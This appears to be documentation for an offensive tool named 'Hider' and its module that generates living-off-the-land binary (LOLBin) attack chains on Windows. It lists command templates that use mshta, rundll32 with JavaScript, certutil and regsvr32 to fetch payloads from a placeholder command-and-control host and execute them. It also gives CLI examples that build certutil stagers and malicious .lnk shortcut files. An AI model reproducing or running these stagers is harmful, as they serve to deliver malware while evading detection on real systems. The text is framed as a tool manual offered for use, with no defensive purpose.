# LOLBin Chains

## 1. Concept: What is it?
LOLBin stands for "Living Of the Land Binary." These are legitimate, digitally signed executables built into the Windows operating system that attackers repurpose to download, stage, or execute malicious payloads.

By using native binaries like `mshta.exe`, `rundll32.exe`, or `certutil.exe` to run a payload, attackers avoid dropping new, unsigned, or suspicious executable files to disk. A process tree involving `explorer.exe -> certutil.exe -> cmd.exe` looks far more legitimate than `explorer.exe -> malware.exe`.

Hider can chain these binaries together, or wrap them inside Malicious Shortcut (`.lnk`) files.

## 2. Implementation: How does it work?
In `lolbin_engine.py`, the `LOLBinEngine` acts as a command generator for known techniques:

* **mshta:** `mshta http://c2/payload.hta`
* **rundll32:** `rundll32 javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell ...",0,true)` (Whitelisted JS engine abuse)
* **certutil:** `certutil -urlcache -f [url] [out] & certutil -decode [out] [dec] & powershell [dec]` (Uses the native certificate manager to download payloads)
* **regsvr32:** `regsvr32 /s /n /u /i:[url] scrobj.dll` (SquiblydooCOM scriptlet execution)

These command strings can be output as raw text or wrapped into a `.lnk` shortcut file using the existing `LNKHandler`. 

## 3. Usage
**CLI Command:**
```bash
# Generate a certutil stager
python3 hider.py lolbin --type certutil --url http://c2/payload.b64 

# Create a malicious LNK shortcut that leverages rundll32
python3 hider.py lolbin --type rundll32 --url http://c2/beacon --lnk malicious.lnk
```
